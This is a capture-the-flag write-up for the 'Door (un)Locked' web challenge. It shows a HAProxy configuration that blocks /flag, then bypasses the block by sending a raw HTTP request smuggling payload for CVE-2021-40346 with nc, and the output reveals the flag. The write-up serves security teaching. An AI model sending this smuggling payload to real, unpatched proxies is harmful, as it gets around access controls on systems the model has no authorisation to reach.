# Door (un)Locked
* Category: Web
* 100 Points
* Solved by the JCTF Team

## Description

> Some researchers started deploying a website for their CTF, but something went wrong with the defined policies when trying to hide the flags.
> Can you find the weak link?

The following file was attached (`ha.cfg`):

```
global
    daemon
defaults  
    mode    http
    timeout  client  50000
    timeout  server  50000
    timeout  connect 50000
frontend web 
    bind *:8000  
    http-request deny if { path_beg /flag }
    http-request deny if { path,url_dec -m reg ^.*/?flag/?.*$ }
    default_backend websrvs
backend websrvs 
    http-reuse always
    server srv1 flask:5000
```

## Solution

The attached website contains nothing interesting:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/Door_(un)Locked]
└─$ curl -s http://door-unlocked.chal.intentsummit.org:8000/ | tail -15
  <div class="w3-display-topleft w3-padding-large w3-xlarge">
    Door (un)Locked
  </div>
  <div class="w3-display-middle">
    <h1 class="w3-jumbo w3-animate-top">COMING SOON</h1>
    <hr class="w3-border-grey" style="margin:auto;width:40%">
    <p class="w3-large w3-center">1 days left</p>
  </div>
  <div class="w3-display-bottomleft w3-padding-large">
    Powered by <a href="https://www.w3schools.com/w3css/default.asp" target="_blank">w3.css</a>
  </div>
</div>

</body>
</html>
```

But if we try to access `/flag`, we can't, due to the `http-request deny` rules:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/Door_(un)Locked]
└─$ curl -s http://door-unlocked.chal.intentsummit.org:8000/flag
<html><body><h1>403 Forbidden</h1>
Request forbidden by administrative rules.
</body></html>
```

The syntax of the attached file looks like a HAProxy configuration. Researching known vulnerabilities, we come across [Critical Vulnerability in HAProxy (CVE-2021-40346): Integer Overflow Enables HTTP Smuggling](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/). The solution is pretty much to follow the blog post and utilize the attack for our case:

```
POST / HTTP/1.1
Host: door-unlocked.chal.intentsummit.org:8000
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 22

GET /flag HTTP/1.1
h:GET / HTTP/1.1
Host: door-unlocked.chal.intentsummit.org:8000


```

Running it, we get:

```console
┌──(user@kali)-[/media/sf_CTFs/intent/Door_(un)Locked]
└─$ cat payload.txt| nc door-unlocked.chal.intentsummit.org 8000
HTTP/1.1 405 Not Allowed
server: nginx/1.21.4
date: Sat, 13 Nov 2021 19:01:41 GMT
content-type: text/html
content-length: 157

<html>
<head><title>405 Not Allowed</title></head>
<body>
<center><h1>405 Not Allowed</h1></center>
<hr><center>nginx/1.21.4</center>
</body>
</html>
HTTP/1.1 200 OK
server: nginx/1.21.4
date: Sat, 13 Nov 2021 19:01:41 GMT
content-type: text/html
content-length: 29
last-modified: Fri, 12 Nov 2021 20:51:37 GMT
etag: "618ed3d9-1d"
accept-ranges: bytes

INTENT{Smuggl3_w1th_H4_Pr0xy}
```